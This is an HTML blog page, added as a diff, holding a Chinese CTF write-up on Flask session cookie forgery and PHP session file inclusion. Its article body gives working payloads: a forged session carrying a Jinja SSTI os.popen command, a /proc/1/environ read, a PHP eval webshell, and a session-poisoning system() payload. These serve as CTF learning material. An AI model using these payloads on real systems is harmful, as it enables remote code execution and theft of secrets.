@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="flask之session伪造 [TOC] 脚本使用方法12解密：python flask_session_cookie_manager3.py decode -s “secret_key” -c “需要解密的session值”加密：python flask_session_cookie_manager3.py encode -s “secret_key” -t “需要加密的session值”">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/04/17/session/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="flask之session伪造 [TOC] 脚本使用方法12解密：python flask_session_cookie_manager3.py decode -s “secret_key” -c “需要解密的session值”加密：python flask_session_cookie_manager3.py encode -s “secret_key” -t “需要加密的session值”">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-04-17T12:12:42.279Z">
+<meta property="article:modified_time" content="2025-05-22T09:46:40.009Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-session" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/17/session/" class="article-date">
+  	<time datetime="2025-04-17T12:12:42.279Z" itemprop="datePublished">2025-04-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>flask之session伪造</p>
+<p>[TOC]</p>
+<h4 id="脚本使用方法"><a href="#脚本使用方法" class="headerlink" title="脚本使用方法"></a>脚本使用方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解密：python flask_session_cookie_manager3.py decode -s “secret_key” -c “需要解密的session值”</span><br><span class="line">加密：python flask_session_cookie_manager3.py encode -s “secret_key” -t “需要加密的session值”</span><br></pre></td></tr></table></figure>
+
+<p><strong>eg.</strong> sqctf 千查万别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python  flask_session_cookie_manager3.py encode -s &quot;Dark_Flame&quot; -t &quot;</span><br><span class="line"> &#123;&#x27;username&#x27;: &#x27;&#123;&#123; </span><br><span class="line">self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\&#x27;c</span><br><span class="line"> at /flag\&#x27;).read() &#125;&#125;&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/view?doc=/proc/1/environ </span><br><span class="line">/proc/self/environ 是一个非常有用的接口 用于获取当前进程的环境变量</span><br></pre></td></tr></table></figure>
+
+<p>1.<strong><code>/proc/[pid]/environ</code> 是一个虚拟文件，其中 <code>[pid]</code> 是进程的 ID。</strong> </p>
+<p>2.<strong>在大多数 Linux 系统中，进程 ID 为 1 的进程是系统的初始化进程。</strong> </p>
+<h4 id="eg2"><a href="#eg2" class="headerlink" title="eg2:"></a>eg2:</h4><p><strong>parload:</strong></p>
+<p>这是Load URL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f903c3a6-f3bf-4bb4-bb8c-4da0754be0fe.www.polarctf.com:8090/action.php/file=/tmp/sess_uqp4q7qfifk2i3r58j55q79ga1</span><br></pre></td></tr></table></figure>
+
+<p><strong>POST：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=hhhh(先上传查到cookie)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最后上传一句话木马name=&lt;?=eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">再用蚁剑连接 即可得到flag</span><br></pre></td></tr></table></figure>
+
+<p>session文件名的构造是sess_ + sessionid ， sessionid在cookie中可以查看</p>
+<p>有了参数，开始猜存放session文件的位置，一般默认为tmp，直接执行命令访问session文件</p>
+<p>这里可以采取两种方式得到flag：命令读取或者蚁剑连接shell</p>
+<h4 id="eg-3-polar-safe-include"><a href="#eg-3-polar-safe-include" class="headerlink" title="eg.3 polar safe_include"></a>eg.3 polar safe_include</h4><p><strong>session文件包含</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">@session_start();</span><br><span class="line"></span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/:/tmp/&#x27;); </span><br><span class="line"></span><br><span class="line">$sys = @$_SESSION[&#x27;xxs&#x27;];</span><br><span class="line">if (isset($_GET[&#x27;xxs&#x27;])) &#123;</span><br><span class="line">    $sys = $_GET[&#x27;xxs&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@include $sys;</span><br><span class="line"></span><br><span class="line">$_SESSION[&#x27;xxs&#x27;] = $sys;</span><br></pre></td></tr></table></figure>
+
+<p>先写入恶意session文件 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xxs=&lt;?php+system(&#x27;tac+/f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>+</code> 在 URL 中表示空格（URL 编码中空格也可以表示为 <code>%20</code>）</li>
+</ul>
+<p>再包含恶意session文件 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xxs=/tmp/sess_cofdad2n8lie1e30im77qhbrv6</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/04/18/CRY/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/04/16/JavaWeb--%E6%B7%B1%E5%85%A5Servlet/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
